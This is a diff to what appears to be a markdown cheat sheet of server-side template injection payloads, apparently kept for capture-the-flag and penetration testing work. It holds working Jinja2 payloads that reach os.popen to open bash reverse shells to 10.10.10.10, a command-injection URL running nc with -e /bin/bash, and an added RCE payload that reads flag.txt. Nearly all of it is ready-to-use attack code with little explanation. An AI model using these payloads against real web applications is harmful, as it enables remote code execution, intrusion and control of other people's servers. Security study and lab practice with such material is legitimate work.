@@ -175,7 +175,7 @@ http://10.10.10.10/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.10.10'$IFS'4444
 {{config.items()}}
 ```
 
-Reverse shell
+ ** Reverse shell
 
 ```
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'").read()}}{%endif%}{%endfor%}
@@ -183,6 +183,12 @@ Reverse shell
 
 ```
 {{request.application.globals.builtins.import('os').popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"').read()}}
+```
+
+** RCE
+
+```
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
 ```
 
 * #### Check Twig
